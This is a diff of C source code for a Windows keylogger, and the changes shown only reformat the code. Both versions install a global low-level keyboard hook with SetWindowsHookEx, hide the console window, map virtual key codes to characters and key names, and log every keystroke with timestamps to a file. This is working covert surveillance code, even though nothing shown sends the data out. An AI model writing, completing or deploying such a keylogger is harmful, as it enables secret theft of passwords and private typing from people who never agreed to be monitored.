@@ -8,8 +8,7 @@
 
 #define VK_A 0x41
 #define VK_Z 0x5A
-
-#define VK_0 0x30 
+#define VK_0 0x30
 #define VK_9 0x39
 
 HHOOK hKeyboardHook;
@@ -17,12 +16,9 @@ HHOOK hKeyboardHook;
 FILE *outFile;
 
 
-void hideConsoleWindow(void)
-{
+void hideConsoleWindow(void) {
     const HWND hWnd = GetConsoleWindow();
-    if (hWnd != NULL) {
-        ShowWindow(hWnd, SW_HIDE);
-    }
+    if (hWnd != NULL) ShowWindow(hWnd, SW_HIDE);
 }
 
 
@@ -37,8 +33,7 @@ void logToOutFile(const char *format, ...) {
 }
 
 
-inline void logCurrentTime(void)
-{
+inline void logCurrentTime(void) {
     struct tm newtime;
     time_t now = time(0);
     localtime_s(&newtime, &now);
@@ -52,56 +47,31 @@ inline void logCurrentTime(void)
 
 inline const char *getSpecialKeyName(const DWORD vkCode) {
     switch (vkCode) {
-        case VK_SHIFT:
-            return "SHIFT";
-        case VK_CONTROL:
-            return "CTRL";
-        case VK_MENU:
-            return "ALT";
-        case VK_LWIN:
-            return "LEFT WINDOWS";
-        case VK_RWIN:
-            return "RIGHT WINDOWS";
-        case VK_CAPITAL:
-            return "CAPS LOCK";
-        case VK_NUMLOCK:
-            return "NUM LOCK";
-        case VK_SCROLL:
-            return "SCROLL LOCK";
-        case VK_ESCAPE:
-            return "ESCAPE";
-        case VK_TAB:
-            return "TAB";
-        case VK_RETURN:
-            return "ENTER";
-        case VK_BACK:
-            return "BACKSPACE";
-        case VK_PRIOR:
-            return "PAGE UP";
-        case VK_NEXT:
-            return "PAGE DOWN";
-        case VK_END:
-            return "END";
-        case VK_HOME:
-            return "HOME";
-        case VK_INSERT:
-            return "INSERT";
-        case VK_DELETE:
-            return "DELETE";
-        case VK_PAUSE:
-            return "PAUSE";
-        case VK_PRINT:
-            return "PRINT SCREEN";
-        case VK_SNAPSHOT:
-            return "SNAPSHOT";
-        case VK_LEFT:
-            return "LEFT ARROW";
-        case VK_UP:
-            return "UP ARROW";
-        case VK_RIGHT:
-            return "RIGHT ARROW";
-        case VK_DOWN:
-            return "DOWN ARROW";
+        case VK_SHIFT:    return "SHIFT";
+        case VK_CONTROL:  return "CTRL";
+        case VK_MENU:     return "ALT";
+        case VK_LWIN:     return "LEFT WINDOWS";
+        case VK_RWIN:     return "RIGHT WINDOWS";
+        case VK_CAPITAL:  return "CAPS LOCK";
+        case VK_NUMLOCK:  return "NUM LOCK";
+        case VK_SCROLL:   return "SCROLL LOCK";
+        case VK_ESCAPE:   return "ESCAPE";
+        case VK_TAB:      return "TAB";
+        case VK_RETURN:   return "ENTER";
+        case VK_BACK:     return "BACKSPACE";
+        case VK_PRIOR:    return "PAGE UP";
+        case VK_NEXT:     return "PAGE DOWN";
+        case VK_END:      return "END";
+        case VK_HOME:     return "HOME";
+        case VK_INSERT:   return "INSERT";
+        case VK_DELETE:   return "DELETE";
+        case VK_PAUSE:    return "PAUSE";
+        case VK_PRINT:    return "PRINT SCREEN";
+        case VK_SNAPSHOT: return "SNAPSHOT";
+        case VK_LEFT:     return "LEFT ARROW";
+        case VK_UP:       return "UP ARROW";
+        case VK_RIGHT:    return "RIGHT ARROW";
+        case VK_DOWN:     return "DOWN ARROW";
 
         default:
             return NULL; 
@@ -115,7 +85,7 @@ inline const char getCharFromVKCode(const DWORD vkCode) {
         (vkCode >= VK_A && vkCode <= VK_Z)) {
         return (char)vkCode;
     }
-    
+
     switch (vkCode) {
         case VK_OEM_1:      return ';';
         case VK_OEM_PLUS:   return '=';
@@ -133,8 +103,7 @@ inline const char getCharFromVKCode(const DWORD vkCode) {
 }
 
 
-void onKeyPressed(const DWORD vkCode)
-{
+void onKeyPressed(const DWORD vkCode) {
     const char character = getCharFromVKCode(vkCode);
     if (character) {
         logToOutFile("%c", character);
@@ -163,8 +132,7 @@ inline LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 
-inline const HHOOK setHook(void)
-{
+inline const HHOOK setHook(void) {
     return SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
 }
 
@@ -180,8 +148,7 @@ inline const errno_t setupKeyLogger(const char *outFileName) {
 }
 
 
-inline void startLogging(void)
-{
+inline void startLogging(void) {
     logCurrentTime();
 
     MSG msg;
@@ -192,8 +159,7 @@ inline void startLogging(void)
 }
 
 
-const errno_t logKeys(const char *outFileName)
-{
+const errno_t logKeys(const char *outFileName) {
     const errno_t err = setupKeyLogger(outFileName);
     if (err) return err;
 
